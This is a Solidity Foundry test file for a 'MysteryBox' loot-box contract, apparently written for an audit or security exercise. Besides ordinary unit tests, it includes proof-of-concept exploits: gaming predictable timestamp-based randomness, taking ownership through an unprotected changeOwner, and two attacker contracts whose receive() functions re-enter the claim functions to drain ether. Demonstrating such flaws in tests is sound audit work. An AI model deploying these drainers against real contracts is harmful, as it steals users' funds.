// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console2} from "forge-std/Test.sol";
import "forge-std/Test.sol";
import "../src/MysteryBox.sol";

contract MysteryBoxTest is Test {
    MysteryBox public mysteryBox;
    address public owner;
    address public user1;
    address public user2;

    function setUp() public {
        owner = makeAddr("owner");
        user1 = address(0x1);
        user2 = address(0x2);
        vm.deal(owner, 0.1 ether);
        vm.prank(owner);
        mysteryBox = new MysteryBox();
        console.log("Reward Pool Length:", mysteryBox.getRewardPool().length);
    }

    function testOwnerIsSetCorrectly() public view {
        assertEq(mysteryBox.owner(), owner);
    }

    function testSetBoxPrice() public {
        uint256 newPrice = 0.2 ether;
        mysteryBox.setBoxPrice(newPrice);
        assertEq(mysteryBox.boxPrice(), newPrice);
    }

    function testSetBoxPrice_NotOwner() public {
        vm.prank(user1);
        vm.expectRevert("Only owner can set price");
        mysteryBox.setBoxPrice(0.2 ether);
    }

    function testAddReward() public {
        mysteryBox.addReward("Diamond Coin", 2 ether);
        MysteryBox.Reward[] memory rewards = mysteryBox.getRewardPool();
        assertEq(rewards.length, 5);
        assertEq(rewards[3].name, "Diamond Coin");
        assertEq(rewards[3].value, 2 ether);
    }

    function testAddReward_NotOwner() public {
        vm.prank(user1);
        vm.expectRevert("Only owner can add rewards");
        mysteryBox.addReward("Diamond Coin", 2 ether);
    }

    function testBuyBox() public {
        vm.deal(user1, 1 ether);
        vm.prank(user1);
        mysteryBox.buyBox{value: 0.1 ether}();
        assertEq(mysteryBox.boxesOwned(user1), 1);
    }

    function testBuyBox_IncorrectETH() public {
        vm.deal(user1, 1 ether);
        vm.prank(user1);
        vm.expectRevert("Incorrect ETH sent");
        mysteryBox.buyBox{value: 0.05 ether}();
    }

    function testOpenBox() public {
        vm.deal(user1, 1 ether);
        vm.prank(user1);
        mysteryBox.buyBox{value: 0.1 ether}();
        console.log("Before Open:", mysteryBox.boxesOwned(user1));
        vm.prank(user1);
        mysteryBox.openBox();
        console.log("After Open:", mysteryBox.boxesOwned(user1));
        assertEq(mysteryBox.boxesOwned(user1), 0);

        vm.prank(user1);
        MysteryBox.Reward[] memory rewards = mysteryBox.getRewards();
        console2.log(rewards[0].name);
        assertEq(rewards.length, 1);
    }

    function testOpenBox_NoBoxes() public {
        vm.prank(user1);
        vm.expectRevert("No boxes to open");
        mysteryBox.openBox();
    }

    function testTransferReward_InvalidIndex() public {
        vm.prank(user1);
        vm.expectRevert("Invalid index");
        mysteryBox.transferReward(user2, 0);
    }

    function testWithdrawFunds() public {
        vm.deal(user1, 1 ether);
        vm.prank(user1);
        mysteryBox.buyBox{value: 0.1 ether}();

        uint256 ownerBalanceBefore = owner.balance;
        console.log("Owner Balance Before:", ownerBalanceBefore);
        vm.prank(owner);
        mysteryBox.withdrawFunds();
        uint256 ownerBalanceAfter = owner.balance;
        console.log("Owner Balance After:", ownerBalanceAfter);

        assertEq(ownerBalanceAfter - ownerBalanceBefore, 0.1 ether);
    }

    function testWithdrawFunds_NotOwner() public {
        vm.prank(user1);
        vm.expectRevert("Only owner can withdraw");
        mysteryBox.withdrawFunds();
    }

    function testChangeOwner() public {
        mysteryBox.changeOwner(user1);
        assertEq(mysteryBox.owner(), user1);
    }

    function testChangeOwner_AccessControl() public {
        vm.prank(user1);
        mysteryBox.changeOwner(user1);
        assertEq(mysteryBox.owner(), user1);
    }

    function testOpenBoxRandomAttack() public {
        vm.deal(user1, 1 ether);
        vm.prank(user1);
    
        bool found = false;
        uint256 randomValue = uint256(keccak256(abi.encodePacked(block.timestamp, user1))) % 100;
        if(randomValue >= 75){
               console.log("find random value",randomValue);
               found =true;
        }
        console.log("block.timestamp",block.timestamp);
        console.log("msg.sender",user1);
        console.log("encode packed value",uint256(keccak256(abi.encodePacked(block.timestamp, user1))));
        console.log(randomValue);
        
        if(found){
            mysteryBox.buyBox{value: 0.1 ether}();
            console.log("Before Open:", mysteryBox.boxesOwned(user1));
            vm.prank(user1);
            mysteryBox.openBox();
            console.log("After Open:", mysteryBox.boxesOwned(user1));
            assertEq(mysteryBox.boxesOwned(user1), 0);

            vm.prank(user1);
            MysteryBox.Reward[] memory rewards = mysteryBox.getRewards();
            console2.log(rewards[0].name);
            assertEq(rewards.length, 1);
        }else{
            console.log("Not need open box");
        }
    }

    function testOpenBoxRandomAttackFindUser() public {

        
        for(int i = 1;i < 100; i++){
            
            address randomUser = address(uint160(uint256(0x2 + i)));
            vm.deal(randomUser, 1 ether);
            vm.startPrank(randomUser);
            mysteryBox.buyBox{value: 0.1 ether}();
            console.log("Before Open:", mysteryBox.boxesOwned(randomUser));
            
            uint256 randomValue = uint256(keccak256(abi.encodePacked(block.timestamp, randomUser))) % 100;
            if(randomValue >= 75){
                console.log("find random value",randomValue);
                mysteryBox.openBox();
                console.log("After Open:", mysteryBox.boxesOwned(randomUser));
                assertEq(mysteryBox.boxesOwned(randomUser), 0);
      
                MysteryBox.Reward[] memory rewards = mysteryBox.getRewards();
                console2.log(rewards[0].name);
                assertEq(rewards.length, 1);             
                //break;

                console.log("block.timestamp",block.timestamp);
                console.log("msg.sender",randomUser);
                console.log("encode packed value",uint256(keccak256(abi.encodePacked(block.timestamp, randomUser))));
                console.log(randomValue);
            }
           
            vm.stopPrank();
        }
       
    }

    
    function testClaimAllRewardsInsufficient() public {

        address user3 = address(0x4);
        
        vm.deal(user1, 1 ether);
        vm.startPrank(user1);
        mysteryBox.buyBox{value: 0.1 ether}();
        vm.stopPrank();

        vm.deal(user3, 1 ether);
        vm.startPrank(user3);
        mysteryBox.buyBox{value: 0.1 ether}();
        console.log("User Buy box");
        mysteryBox.openBox();
        console.log("User Open box");
        assertEq(mysteryBox.boxesOwned(user3), 0);

        MysteryBox.Reward[] memory rewards = mysteryBox.getRewards();
        console.log("User rewards name:",rewards[0].name);
        console.log("User rewards value:",rewards[0].value);
        
        uint256 balance = address(mysteryBox).balance;
        console.log("Contract balance ",balance);
        console.log("User reward balance is greater than contract balance:",rewards[0].value > balance);
        mysteryBox.claimAllRewards();
        vm.stopPrank();
    }

    function testClaimSingleRewardInsufficient() public {

        address user3 = address(0x4);
        
        vm.deal(user1, 1 ether);
        vm.startPrank(user1);
        mysteryBox.buyBox{value: 0.1 ether}();
        vm.stopPrank();

        vm.deal(user3, 1 ether);
        vm.startPrank(user3);
        mysteryBox.buyBox{value: 0.1 ether}();
        console.log("User Buy box");
        mysteryBox.openBox();
        console.log("User Open box");
        assertEq(mysteryBox.boxesOwned(user3), 0);

        MysteryBox.Reward[] memory rewards = mysteryBox.getRewards();
        console.log("User rewards name:",rewards[0].name);
        console.log("User rewards value:",rewards[0].value);
        
        uint256 balance = address(mysteryBox).balance;
        console.log("Contract balance ",balance);
        console.log("User reward balance is greater than contract balance:",rewards[0].value > balance);
        mysteryBox.claimSingleReward(0);
        vm.stopPrank();
    }
}

contract MysteryBoxAttack is Test {
    MysteryBox mysteryBox;
    address user3 = address(0x2f);

    constructor(address _mysteryBox) {
        mysteryBox = MysteryBox(_mysteryBox);
    }

    function Attack() public {
    
        console.log("Attack contract balance", address(this).balance);
        mysteryBox.claimSingleReward(0);
        console.log("Attack contract balance", address(this).balance);
        console.log("MysteryBox balance", address(mysteryBox).balance);
        
    }

    // fallback() external payable {}

    // we want to use fallback function to exploit reentrancy
    receive() external payable {
        console.log("Attack contract balance ", address(this).balance);
        console.log("MysteryBox balance", address(mysteryBox).balance);
        if (address(mysteryBox).balance >= 0.1 ether) {
            mysteryBox.claimSingleReward(0); // exploit here
        }
    }
}


contract ContractTest is Test {
    MysteryBox mysteryBox;
    MysteryBoxAttack attack;

    address user1 = address(0x1);
    address user3 = address(0x2f);
    address user4 = address(0x4);

    function setUp() public {
        mysteryBox = new MysteryBox(); 
       
        attack = new MysteryBoxAttack(address(mysteryBox));
        vm.deal(user1, 1 ether);
        vm.startPrank(user1);
        mysteryBox.buyBox{value: 0.1 ether}();
        vm.stopPrank();

        vm.deal(user4, 1 ether);
        vm.startPrank(user4);
        mysteryBox.buyBox{value: 0.1 ether}();
        vm.stopPrank();

        vm.deal(user3, 1 ether);
        vm.startPrank(user3);
        mysteryBox.buyBox{value: 0.1 ether}();
        console.log("User Buy box");
        console.log(
            "After buy box, MysteryBox balance",
            address(mysteryBox).balance
        );

        mysteryBox.openBox();
        console.log("User Open box");
        assertEq(mysteryBox.boxesOwned(user3), 0);

        MysteryBox.Reward[] memory rewards = mysteryBox.getRewards();
        console.log("User rewards name:",rewards[0].name);
        console.log("User rewards value:",rewards[0].value);
        
        mysteryBox.transferReward(address(attack),0);
        console.log("User reward transfer to attack contract");
        vm.stopPrank();
    }

    function testReentrancy() public {
        attack.Attack();
    }

}

contract MysteryBoxClaimAllAttack is Test {
    MysteryBox mysteryBox;
    address user3 = address(0x2f);

    constructor(address _mysteryBox) {
        mysteryBox = MysteryBox(_mysteryBox);
    }

    function Attack() public {
    
        console.log("Attack contract balance", address(this).balance);
        mysteryBox.claimAllRewards();
        console.log("Attack contract balance", address(this).balance);
        console.log("MysteryBox balance", address(mysteryBox).balance);
        
    }

    // fallback() external payable {}

    // we want to use fallback function to exploit reentrancy
    receive() external payable {
        console.log("Attack contract balance ", address(this).balance);
        console.log("MysteryBox balance", address(mysteryBox).balance);
        if (address(mysteryBox).balance >= 0.1 ether) {
            mysteryBox.claimAllRewards(); // exploit here
        }
    }
}

contract ContractClaimAllTest is Test {
    MysteryBox mysteryBox;
    MysteryBoxAttack attack;

    address user1 = address(0x1);
    address user3 = address(0x2f);
    address user4 = address(0x4);

    function setUp() public {
        mysteryBox = new MysteryBox(); 
       
        attack = new MysteryBoxAttack(address(mysteryBox));
        vm.deal(user1, 1 ether);
        vm.startPrank(user1);
        mysteryBox.buyBox{value: 0.1 ether}();
        vm.stopPrank();

        vm.deal(user4, 1 ether);
        vm.startPrank(user4);
        mysteryBox.buyBox{value: 0.1 ether}();
        vm.stopPrank();

        vm.deal(user3, 1 ether);
        vm.startPrank(user3);
        mysteryBox.buyBox{value: 0.1 ether}();
        console.log("User Buy box");
        console.log(
            "After buy box, MysteryBox balance",
            address(mysteryBox).balance
        );

        mysteryBox.openBox();
        console.log("User Open box");
        assertEq(mysteryBox.boxesOwned(user3), 0);

        MysteryBox.Reward[] memory rewards = mysteryBox.getRewards();
        console.log("User rewards name:",rewards[0].name);
        console.log("User rewards value:",rewards[0].value);
        
        mysteryBox.transferReward(address(attack),0);
        console.log("User reward transfer to attack contract");
        vm.stopPrank();
    }

    function testClaimAllReentrancy() public {
        attack.Attack();
    }

}
